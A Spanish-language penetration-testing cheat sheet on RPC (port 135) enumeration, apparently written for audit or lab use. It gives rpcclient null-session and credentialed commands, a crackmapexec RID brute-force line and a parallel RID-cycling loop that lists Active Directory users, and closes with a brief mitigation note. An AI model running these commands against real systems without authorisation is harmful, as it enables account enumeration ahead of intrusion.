# Remote Procedure Call 

El protocolo **RPC** (**Remote Procedure Call** o **llamada a procedimiento remoto**) es un protocolo que permite a un programa solicitar un servicio a un programa ubicado en otro equipo dentro de una red. (Puerto **135**)

Por otro lado, los **RID** (**Relative Identifier**) son una parte de los *SID* (*Security Identifier*) que identifica de manera única a una cuenta o grupo dentro de un dominio o equio local. 

-----
# Enumeración 

La enumeración del protcolo *RPC* puede ser fundamental en una auditoria para enumerar usuarios, grupos, etc.

Para esto podemos hacaer uso de herramientas como **rpcclient**. 

#### Enumeración
```bash
rpcclient -U "" {target_ip} -N
# Intentar obtener una consola haciendo uso de una NULL session para poder enumerar usuarios, grupos, etc. 
rpcclient -U "{username}%{password}" {target_ip} -N
# Intentar obtener una consola haciendo uso de credenciales para poder enumerar usuarios, grupos, etc. 
```
#### Comandos en "rpcclient $>": 
```bash
enumdomusers 
# Listar los usuarios junto a sus rid
enumdomgroups
# Listar los grupos junto a su rid
querygroupmem {rid} 
# Listar los usuarios pertenecientes a un grupo 
queryuser {rid}
# Listar datos del usuario ingresado
querydispinfo
# Listar descripciones de los grupos 
```
 También podríamos intentar brute forcear estos valores mediante herramientas como **crackmapexec**:
```bash
crackmapexec smb {domain} -u anonymous -p "" --rid-brute 10000
```

----
# RID Cycling attack

Adiconalmente, la técnica *RID Cycling* es un método utilizado para enumerar cuentas de usuario en un sistema Windows. Este ataque explota el hecho de que se puedan cosnultar los **SIDs** (**Securit Identifiers**) de manera incremental mediante solictudes RPC, incluso si las políticas de acceso de la red son restrictivas.

Para llevar a cabo el ataque *RID Cycling*, podemos hacer uso de herramientas como `rpcclient` de Samba o `crackmapexec`.

```bash
rpcclient -U 'guest%' {target_IP} -c 'lookupnames administrator'
```

Una vez ejecutado el comando indicado, veremos en el stdout el *SID*, por ejemplo:

```bash
administrator S-1-5-21-4078382237-1492182817-2568127209-500 (User: 1)
```

Donde el *SID* sería *administrator S-1-5-21-4078382237-1492182817-2568127209-* y el *RID* el número final *500*. Entendiendo esta composición, podremos hacer uso del SID e iterar por diversos valores en la posición del *RID*:

```bash
seq 400 2000 | xargs -P 200 -I {} rpcclient -U 'guest%' {target_IP} -c 'lookupsids S-1-5-21-4078382237-1492182817-2568127209-{}' | grep -v unknown
```

De esta manera, lograríamos obtener un listado de usuarios válidos en el dominio de *Active Directory* o en el equipo local del workstation.

----
# Mitigating RID Cycling

Para evitar este tipo de ataques, se recomienda restringir el acceso a RPC a través de firewalls y políticas de acceso, así como monitorear el tráfico de red.


